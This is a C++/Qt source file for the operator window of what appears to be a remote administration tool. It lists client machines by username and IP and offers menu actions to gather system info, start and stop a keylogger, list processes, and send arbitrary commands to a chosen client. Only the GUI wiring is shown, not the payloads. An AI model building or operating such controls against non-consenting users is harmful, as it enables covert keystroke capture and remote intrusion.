#include "MainWindow.hpp"
#include "../database/LPTF_Database.hpp"
#include <QTimer>
#include <QColor>
#include <QFont>

/**
 * @brief Constructs the window, wires button, and pre-maps default tab.
 * @param parent Optional parent widget.
 */
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent), ui(new Ui::MainWindow), analysisWidget_(nullptr), database_(nullptr)
{
    ui->setupUi(this);
    connect(ui->selectionButton, &QPushButton::clicked,
            this, &MainWindow::onSelectionButtonClicked);
    connect(ui->analyzeButton, &QPushButton::clicked,
            this, &MainWindow::onAnalyzeButtonClicked);
    
    const QString firstLabel = ui->tabWidget->tabText(0);
    clientTabs[firstLabel] = ui->listWidget;
    
    // Create analysis widget
    analysisWidget_ = new AnalysisWidget();
}

/**
 * @brief Destructor cleans up UI.
 */
MainWindow::~MainWindow()
{
    delete analysisWidget_;
    delete ui;
}

/**
 * @brief Set the database connection for analysis functionality
 * @param database Pointer to the database instance
 */
void MainWindow::setDatabase(LPTF_database* database)
{
    database_ = database;
    if (analysisWidget_) {
        analysisWidget_->setDatabase(database);
    }
}

/**
 * @brief Handle analyze button click - opens the analysis widget
 */
void MainWindow::onAnalyzeButtonClicked()
{
    if (!analysisWidget_) {
        qDebug() << "[GUI] Analysis widget not initialized";
        QMessageBox::warning(this, "Erreur", "Le widget d'analyse n'est pas disponible.");
        return;
    }
    
    if (!database_) {
        qDebug() << "[GUI] No database connection for analysis";
        QMessageBox::warning(this, "Erreur", "Aucune connexion à la base de données disponible.");
        return;
    }
    
    qDebug() << "[GUI] Opening analysis widget";
    analysisWidget_->show();
    analysisWidget_->raise();
    analysisWidget_->activateWindow();
}

/**
 * @brief Handles a newly connected client: updates session and ensures UI presence.
 * @param clientInfo Combined username and IP.
 * @param sessionId Session identifier assigned.
 */
void MainWindow::onClientConnected(const QString &clientInfo, uint32_t sessionId)
{
    m_sessionIds[clientInfo] = sessionId;
    updateClientStatus(clientInfo, true);
    addClientTab(clientInfo);
}

/**
 * @brief Adds a new tab for a client if missing.
 * @param clientId Identifier string for the client.
 */
void MainWindow::addClientTab(const QString &clientId)
{
    if (clientTabs.contains(clientId))
        return;
    QWidget *page = new QWidget;
    auto layout = new QVBoxLayout(page);
    layout->setContentsMargins(11, 20, 12, 49);
    QListWidget *outList = new QListWidget;
    layout->addWidget(outList);
    int idx = ui->tabWidget->addTab(page, clientId);
    ui->tabWidget->setCurrentIndex(idx);
    clientTabs[clientId] = outList;
}

/**
 * @brief Clears existing contents and appends new output lines for a client.
 * @param clientId Identifier of the client tab to update.
 * @param text Full text to split and show.
 */
void MainWindow::appendClientOutput(const QString &clientId, const QString &text)
{
    qDebug() << "[GUI] appendClientOutput for" << clientId << "len=" << text.size();
    if (!clientTabs.contains(clientId))
        return;
    QListWidget *list = clientTabs[clientId];
    list->clear();
    const QStringList lines = text.split(u'\n', Qt::SkipEmptyParts);
    for (const QString &line : lines)
    {
        list->addItem(line);
    }
}

/**
 * @brief Handles a response from a client by delegating to output append.
 * @param clientId Identifier of the originating client.
 * @param text Payload text to display.
 */
void MainWindow::onClientResponse(const QString &clientId, const QString &text)
{
    qDebug() << "[GUI] onClientResponse for" << clientId << "text len=" << text.size();
    appendClientOutput(clientId, text);
}

void MainWindow::executeCommand(const QString &clientId)
{
    bool ok = false;
    QString cmd = QInputDialog::getText(this, tr("Execute Command"), tr("Enter command to run on client:"),
                                        QLineEdit::Normal, QString(), &ok);
    if (ok && !cmd.isEmpty())
    {
        qDebug() << "[GUI] Executing command on" << clientId << ":" << cmd;
        emit sendToClient(clientId, cmd.toUtf8());
    }
}

/**
 * @brief Handles user action on selection button, emitting appropriate signals.
 */
void MainWindow::onSelectionButtonClicked()
{
    int idx = ui->comboBox->currentIndex();
    QListWidgetItem *selectedItem = ui->clientListWidget->currentItem();
    if (!selectedItem)
    {
        QMessageBox::warning(this, "Warning", "Please select a client!");
        return;
    }
    QString clientId = selectedItem->text();
    // Remove status suffix if present
    if (clientId.contains("(En ligne)")) {
        clientId = clientId.replace(" (En ligne)", "");
    } else if (clientId.contains("(Hors ligne)")) {
        clientId = clientId.replace(" (Hors ligne)", "");
    }
    qDebug() << "[GUI] onSelectionButtonClicked idx=" << idx << "client=" << clientId;
    switch (idx)
    {
    case 0:
        emit getInfoSys(clientId);
        break;
    case 1:
        emit startKeylogger(clientId);
        break;
    case 2:
        emit stopKeylogger(clientId);
        break;
    case 3:
        emit requestProcessList(clientId, false);
        break;
    case 4:
        emit requestProcessList(clientId, true);
        break;
    case 5:
        MainWindow::executeCommand(clientId);
        break;
    // case 6: Placeholder for disconnecting client
    // case 7: Placeholder for data analysis
    default:
        break;
    }
}

/**
 * @brief Handles client disconnection by updating visual status
 * @param clientInfo Combined username and IP of disconnected client
 */
void MainWindow::onClientDisconnected(const QString &clientInfo)
{
    updateClientStatus(clientInfo, false);
}

/**
 * @brief Loads clients from database and populates the GUI
 * @param clients List of client data from database
 */
void MainWindow::onClientsLoadedFromDatabase(const QList<QMap<QString, QVariant>> &clients)
{
    QListWidget *listWidget = ui->clientListWidget;
    listWidget->clear();
    
    for (const auto &clientData : clients) {
        QString username = clientData["username"].toString();
        QString ip = clientData["ip"].toString();
        bool isOnline = clientData["online_status"].toBool();
        QString clientInfo = username + " " + ip;
        
        // Add client to list with appropriate visual styling
        QListWidgetItem *item = new QListWidgetItem(clientInfo);
        
        if (isOnline) {
            // Green color for online clients
            item->setForeground(QColor(0, 150, 0));
            item->setFont(QFont("Arial", -1, QFont::Bold));
            item->setText(clientInfo + " (En ligne)");
        } else {
            // Gray color for offline clients  
            item->setForeground(QColor(128, 128, 128));
            item->setFont(QFont("Arial", -1, QFont::Normal));
            item->setText(clientInfo + " (Hors ligne)");
        }
        
        listWidget->addItem(item);
        
        // Create tab for each client (even offline ones for history)
        addClientTab(clientInfo);
    }
    
    qDebug() << "[GUI] Loaded" << clients.size() << "clients from database";
}

/**
 * @brief Updates the visual status of a client in the list
 * @param clientInfo Combined username and IP
 * @param isOnline Whether the client is currently online
 */
void MainWindow::updateClientStatus(const QString &clientInfo, bool isOnline)
{
    QListWidget *listWidget = ui->clientListWidget;
    QListWidgetItem *item = findClientItem(clientInfo);
    
    if (!item) {
        // Client not in list, add it
        item = new QListWidgetItem();
        listWidget->addItem(item);
    }
    
    if (isOnline) {
        // Green color and bold for online clients
        item->setForeground(QColor(0, 150, 0));
        item->setFont(QFont("Arial", -1, QFont::Bold));
        item->setText(clientInfo + " (En ligne)");
    } else {
        // Gray color for offline clients
        item->setForeground(QColor(128, 128, 128));
        item->setFont(QFont("Arial", -1, QFont::Normal));
        item->setText(clientInfo + " (Hors ligne)");
    }
}

/**
 * @brief Finds a client item in the list widget
 * @param clientInfo Combined username and IP to search for
 * @return Pointer to the item if found, nullptr otherwise
 */
QListWidgetItem* MainWindow::findClientItem(const QString &clientInfo)
{
    QListWidget *listWidget = ui->clientListWidget;
    for (int i = 0; i < listWidget->count(); ++i) {
        QListWidgetItem *item = listWidget->item(i);
        QString itemText = item->text();
        // Remove status suffix to compare base client info
        if (itemText.contains("(En ligne)")) {
            itemText = itemText.replace(" (En ligne)", "");
        } else if (itemText.contains("(Hors ligne)")) {
            itemText = itemText.replace(" (Hors ligne)", "");
        }
        
        if (itemText == clientInfo) {
            return item;
        }
    }
    return nullptr;
}
